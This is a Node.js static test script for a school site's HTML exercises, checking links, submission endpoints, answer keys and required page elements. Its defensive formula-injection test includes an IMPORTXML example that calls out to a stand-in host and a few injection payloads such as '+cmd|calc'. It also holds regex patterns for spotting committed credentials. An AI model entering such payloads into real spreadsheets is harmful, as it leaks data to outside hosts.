#!/usr/bin/env node
/*
 * check-activities.js — the static layer of the activities test suite.
 *
 *   node scripts/check-activities.js            run every check, exit 1 on a new failure
 *   node scripts/check-activities.js --list     print findings without failing
 *
 * WHY THIS EXISTS
 * Every exercise on the site is a standalone HTML file that a student completes
 * unsupervised and submits to a teacher. Nothing sat between "a generator wrote a
 * page" and "a class of fourteen-year-olds used it". This is the cheapest layer of
 * the suite described in docs/activities-test-suite-spec.md: no browser, no
 * network, no dependencies — it reads the tree and the derived inventory and
 * asserts the things that can be known without executing anything.
 *
 * It found uni-al-munir-relationships.html on its first run: a live, hub-linked
 * page whose SHEET_URL was still the template placeholder, so every submission
 * failed and the student's work was lost.
 *
 * THE CONTRACT IS DERIVED, NOT DECLARED.
 * An earlier draft of the spec had every page carry data-testid hooks. They were
 * dropped deliberately: exercise.js reads #score-display, not data-testid, so a
 * parallel set of attributes could be green while the page was broken — and
 * stamping them onto ~187 files would fight build-head.js, which owns a block on
 * every page and must run last. Instead a page's obligations are inferred from
 * what it declares (docs/inventory.json), which cannot drift from the code that
 * actually runs. See the spec's §2 for the full argument.
 *
 * CAPABILITY-BASED, NOT UNIFORM. Three pages would fail a blanket "every page has
 * all five ids" rule while being perfectly correct: 10c-london-slang.html has its
 * own submitAnswers() and needs no #submit-btn; two uni pages are free-text and
 * record no score. Requirements below are therefore keyed to what each page does.
 *
 * BUCKETS (spec §6.1) — a wall of undifferentiated red is unreadable:
 *   infra     the page or an asset it names is missing or unusable
 *   contract  it loaded, but the harness could not drive it — template drift
 *   logic     it would drive fine, but the data behind it is wrong
 */
const fs = require('fs');
const path = require('path');
const graded = require('./extract-graded.js');

const ROOT = path.join(__dirname, '..');
const rd = f => fs.readFileSync(path.join(ROOT, f), 'utf8');
const exists = f => fs.existsSync(path.join(ROOT, f));

const inventory = JSON.parse(rd('docs/inventory.json'));
const exercises = JSON.parse(rd('data/exercises.json'));

/* Known, accepted failures. Each entry carries an owner, a reason and a review
   date so the file cannot quietly become a place where problems go to die. */
const BASELINE_PATH = 'docs/activities-baseline.json';
const baseline = exists(BASELINE_PATH) ? JSON.parse(rd(BASELINE_PATH)) : [];
const baselined = new Map(baseline.map(b => [b.id, b]));

const findings = [];
/* `id` must be stable across runs — it is what the baseline matches on. */
function fail(bucket, check, file, message, detail) {
  const id = [check, file, detail].filter(Boolean).join(':');
  findings.push({ id, bucket, check, file, message });
}

const src = {};                                  // read each page at most once
for (const e of inventory) src[e.file] = rd(e.file);

const byFile = new Map(inventory.map(e => [e.file, e]));
const isExercise = e => e.architecture === 'framework' || e.architecture === 'abitur';

/* ---------------------------------------------------------------- 1. manifest */

const seen = new Set();
for (const e of exercises) {
  if (!exists(e.file)) {
    fail('infra', 'manifest-missing-file', e.file,
         'listed in data/exercises.json but not present in the repo');
  }
  if (seen.has(e.file)) {
    fail('logic', 'manifest-duplicate', e.file, 'appears more than once in data/exercises.json');
  }
  seen.add(e.file);
}

/* Every link a hub makes must resolve. This is what would have caught a page
   renamed without its hub card being updated. */
const HREF = /href="\.?\/?([a-z0-9][a-z0-9_\-]*\.html)(?:[?#][^"]*)?"/gi;
for (const e of inventory.filter(x => x.architecture === 'hub')) {
  let m;
  const re = new RegExp(HREF.source, HREF.flags);
  while ((m = re.exec(src[e.file]))) {
    if (!exists(m[1])) {
      fail('infra', 'hub-dead-link', e.file, `links to ${m[1]}, which does not exist`, m[1]);
    }
  }
}

/* An exercise no hub links to is unreachable for a student. Hubs, landing pages
   and lead magnets are reached other ways and are deliberately exempt. */
for (const e of inventory) {
  if (isExercise(e) && !e.linked) {
    fail('infra', 'orphan-exercise', e.file, 'not linked from any hub — unreachable');
  }
}

/* ------------------------------------------------------- 2. endpoints, secrets */

for (const e of inventory) {
  if (e.submissionType === 'invalid') {
    const url = (src[e.file].match(/(?:var|const|let)\s+SHEET_URL\s*=\s*['"]([^'"]*)['"]/) || [])[1];
    fail('infra', 'endpoint-invalid', e.file,
         `SHEET_URL is not a usable https endpoint (${JSON.stringify(url)}) — submissions are lost`);
  }
}

/* Unreplaced scaffolding anywhere in a live page. _template.html is the one file
   that is supposed to contain placeholders. */
for (const e of inventory) {
  if (e.architecture === 'template') continue;
  const m = src[e.file].match(/PASTE_[A-Z0-9_]+|YOUR_[A-Z0-9_]{4,}|TODO_[A-Z0-9_]+/);
  if (m) {
    fail('infra', 'placeholder-left', e.file, `contains the unreplaced placeholder ${m[0]}`, m[0]);
  }
}

/* A page's own submission endpoint is not a secret — the browser posts straight to
   it, so it is public by construction and must not be flagged. Real credentials
   must never be committed. */
const SECRETS = [
  [/AIza[0-9A-Za-z_\-]{35}/, 'Google API key'],
  [/AKIA[0-9A-Z]{16}/, 'AWS access key id'],
  [/xox[baprs]-[0-9A-Za-z-]{10,}/, 'Slack token'],
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----/, 'private key'],
  [/Bearer\s+[A-Za-z0-9\-._~+/]{24,}/, 'bearer token'],
];
for (const e of inventory) {
  for (const [re, what] of SECRETS) {
    if (re.test(src[e.file])) fail('infra', 'secret-committed', e.file, `looks like a committed ${what}`, what);
  }
}

/* ------------------------------------------------------- 3. the derived contract */

/* Present on 100% of framework pages today; exercise.js drives all three and a
   page missing one is broken, not merely untestable. */
const ALWAYS = ['step-0', 'progress-fill', 'summary-container'];

for (const e of inventory.filter(x => x.architecture === 'framework')) {
  const s = src[e.file];
  const has = id => s.includes(`id="${id}"`);

  for (const id of ALWAYS) {
    if (!has(id)) fail('contract', 'missing-hook', e.file, `no #${id}`, id);
  }

  /* Standard feature #4 in CLAUDE.md: "every exercise must have" a step-jump bar.
     renderStepNav() is null-guarded, so a page without one degrades silently
     rather than erroring — which is exactly why nothing had noticed. */
  if (!has('step-nav')) {
    fail('contract', 'missing-hook', e.file, 'no #step-nav — students cannot jump between steps', 'step-nav');
  }

  /* Only required if the page actually routes through the shared submit flow.
     submitToSheet() does `document.getElementById('submit-btn').disabled = true`
     with no guard, so for those pages a missing button is a hard TypeError. */
  if (/\bsubmitToSheet\s*\(/.test(s) && !has('submit-btn')) {
    fail('contract', 'missing-hook', e.file,
         'calls submitToSheet() but has no #submit-btn — submission throws', 'submit-btn');
  }

  /* Only required if the page records a score. Pages that record one but cannot
     show it are the inverse of the 2026-08-12 "ten pages silently not grading"
     bug: the teacher gets a grade the student never saw. */
  const recordsScore = graded.gradedCalls(s).length > 0 || /state\.scores\s*\[/.test(s);
  if (recordsScore && !has('score-display')) {
    fail('contract', 'missing-hook', e.file,
         'records a score but has no #score-display — the student never sees their Note', 'score-display');
  }

  /* extract-graded.js resolves UNIT with a `var`-only regex while the inventory
     accepts var|const|let. Where the two disagree the extractor silently treats
     the page as unnamed, which is how a page drops out of the explanations
     backlog without anyone noticing. */
  if (e.unit && graded.gradedCalls(s).length && graded.unitOf(s) !== e.unit) {
    fail('contract', 'unit-unresolvable', e.file,
         `inventory reads UNIT="${e.unit}" but extract-graded.js resolves "${graded.unitOf(s)}"`);
  }
}

/* -------------------------------------------------------- 4. answer-key sanity */

const OPTS_MIN = 2, OPTS_MAX = 12;
const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

/* Some pages build their gaps at runtime with innerHTML from a data array —
   uni-relationships-vocab.html writes `'exA-v' + i`, california-exercises.html
   has renderGapText. Those <select>s do not exist in the source, so a static
   reader cannot see them and must not claim they are missing: this is the
   `not_applicable` the spec asks for, recorded rather than silently skipped, and
   left for the browser layer to cover. */
function buildsGapsAtRuntime(s, prefix) {
  return new RegExp(`['"]${esc(prefix)}[^'"]*['"]\\s*\\+`).test(s);
}

let unverifiableGaps = 0, unverifiablePages = new Set();

for (const e of inventory.filter(x => x.answerKeyType === 'dropdowns'
                                   && x.architecture !== 'template')) {
  const s = src[e.file];
  let points = 0;

  for (const call of graded.gradedCalls(s)) {
    const runtime = buildsGapsAtRuntime(s, call.prefix);
    for (const g of call.ids) {
      const where = `${call.scoreKey}.${g}`;
      const d = graded.gapDetail(s, call, g);

      if (!d) {
        if (runtime) {
          /* Still checkable from the key alone, even with no element to read. */
          unverifiableGaps++; unverifiablePages.add(e.file);
          const a = call.answers[g];
          const acc = Array.isArray(a) ? a : (a == null ? [] : [a]);
          if (!acc.length || acc.every(x => String(x).trim() === '')) {
            fail('logic', 'gap-no-answer', e.file, `${where} has no correct answer`, where);
          } else points++;
          continue;
        }
        fail('contract', 'gap-missing-element', e.file,
             `answer key names ${where}, but #${call.prefix}${g} is not in the page`, where);
        continue;
      }
      points++;

      const answer = d.answer;
      const accept = Array.isArray(answer) ? answer : (answer == null ? [] : [answer]);

      if (!accept.length || accept.every(a => String(a).trim() === '')) {
        fail('logic', 'gap-no-answer', e.file, `${where} has no correct answer`, where);
        continue;
      }
      /* An answer that is not among the options can never be selected, so the gap
         is unscoreable however the student answers. */
      if (d.opts.length) {
        const missing = accept.filter(a => !d.opts.includes(a));
        if (missing.length) {
          fail('logic', 'gap-answer-not-an-option', e.file,
               `${where} keys ${JSON.stringify(missing)}, absent from its options`, where);
        }
        if (accept.length >= d.opts.length) {
          fail('logic', 'gap-every-option-correct', e.file,
               `${where} accepts all ${d.opts.length} options — it cannot be got wrong`, where);
        }
        if (d.opts.length < OPTS_MIN || d.opts.length > OPTS_MAX) {
          fail('logic', 'gap-option-count', e.file,
               `${where} offers ${d.opts.length} options (expected ${OPTS_MIN}–${OPTS_MAX})`, where);
        }
      }
    }
  }

  if (points === 0) {
    fail('logic', 'gradable-no-points', e.file, 'declared gradable but no gap resolved to a point');
  }
}

/* ------------------------------------------------- 5. Apps Script write safety */

/*
 * Spreadsheet formula injection. A student answer is user-controlled text that
 * lands in a cell the teacher later opens. Google Sheets and Excel both treat a
 * leading =, +, - or @ as a formula, so an answer of
 *     =IMPORTXML("https://example.invalid/?"&A1,"//x")
 * is not stored, it is executed — reading neighbouring cells and calling out to
 * whoever wrote it. The fix is to write such values as text.
 *
 * Scope: apps-script.gs only, which is the Business English / University / IT
 * path. Year 7–10 and MSA go to Make → Excel `addATableRow`, whose behaviour
 * lives in a Make scenario and cannot be exercised from this repo — see the
 * spec's §3.7. Nothing here touches a real spreadsheet: SpreadsheetApp is a mock
 * and only routeSubmission() is called.
 */
const RISKY = /^[=+\-@]/;

function appsScriptWrites(data) {
  const written = [];
  const mkSheet = () => ({
    appendRow(row) { written.push(row); },
    getLastColumn: () => 3,
    getRange: () => ({ getValues: () => [['Timestamp', 'Name', 'Class']], setValues() {} }),
  });
  const sheets = new Map();
  const ss = {
    getSheetByName: n => sheets.get(n) || null,
    insertSheet(n) { const s = mkSheet(); sheets.set(n, s); return s; },
  };
  const sandbox = { SpreadsheetApp: { getActiveSpreadsheet: () => ss } };
  const fn = new Function('SpreadsheetApp',
    rd('apps-script.gs') + '\nreturn routeSubmission;')(sandbox.SpreadsheetApp);
  fn(ss, data);
  return written.flat().filter(v => typeof v === 'string');
}

/* Both paths: a bespoke column layout and the universal handler every new
   exercise falls through to. */
const PAYLOADS = [
  ['universal', { unit: 'be-negotiations', name: '=1+1', cls: '9c',
                  exA: '@SUM(A1:A9)', exB: '-2+3', exC: '+cmd|calc' }],
  ['custom-layout', { unit: 'california-hazards', name: '=HYPERLINK("http://x","c")', cls: '9g',
                      exD: { para: '=IMPORTXML("http://x","//y")', opinion: 'fine' } }],
];

for (const [label, payload] of PAYLOADS) {
  let cells;
  try {
    cells = appsScriptWrites(payload);
  } catch (err) {
    fail('infra', 'apps-script-harness', 'apps-script.gs',
         `could not drive routeSubmission (${label}): ${err.message}`, label);
    continue;
  }
  const risky = cells.filter(v => RISKY.test(v));
  if (risky.length) {
    fail('logic', 'apps-script-formula-injection', 'apps-script.gs',
         `${label} path writes ${risky.length} user-controlled value(s) that a spreadsheet ` +
         `will evaluate as formulas, e.g. ${JSON.stringify(risky[0])}`, label);
  }
}

/* ------------------------------------------------------------------- 6. report */

/* Output, not failure (spec §3.6) — a standing list of what still runs on the MSA
   Bewertungstabelle rather than the classroom Punktetabelle. */
const msa = inventory.filter(e => e.gradeSystem === 'msa').map(e => e.file);

const fresh = findings.filter(f => !baselined.has(f.id));
const known = findings.filter(f => baselined.has(f.id));

findings.sort((a, b) => a.file.localeCompare(b.file) || a.id.localeCompare(b.id));

const fw = inventory.filter(e => e.architecture === 'framework');
const gradable = fw.filter(e => e.gradable);
console.log('check-activities — %d pages (%d framework, %d gradable, %d Abitur packs)',
            inventory.length, fw.length, gradable.length,
            inventory.filter(e => e.architecture === 'abitur').length);
/* Coverage, so `not_applicable` can never quietly become most of the suite. A
   shrinking numerator here is the signal that the suite is checking less than it
   appears to. */
console.log('  answer keys machine-readable: %d / %d gradable framework pages (%d bespoke)',
            fw.filter(e => e.answerKeyType === 'dropdowns').length, gradable.length,
            fw.filter(e => e.answerKeyType === 'bespoke').length);
if (unverifiableGaps) {
  console.log('  gaps built at runtime, not statically checkable: %d across %d page(s) — %s',
              unverifiableGaps, unverifiablePages.size, [...unverifiablePages].sort().join(', '));
}
console.log('  grade systems: %d default, %d msa', fw.length - msa.length, msa.length);

if (msa.length) console.log('\nMSA grading (informational, not a failure): %s', msa.join(', '));

function show(list, heading) {
  if (!list.length) return;
  console.log('\n%s', heading);
  for (const b of ['infra', 'contract', 'logic']) {
    const rows = list.filter(f => f.bucket === b);
    if (!rows.length) continue;
    console.log('  [%s] %d', b, rows.length);
    for (const f of rows) console.log('    %s — %s', f.file, f.message);
  }
}

show(known, `Known failures (${known.length}) — accepted in ${BASELINE_PATH}:`);
show(fresh, `FAILURES (${fresh.length}):`);

if (!findings.length) console.log('\n✓ no findings.');
else if (!fresh.length) console.log('\n✓ no new findings (%d known).', known.length);

if (fresh.length && !process.argv.includes('--list')) process.exit(1);
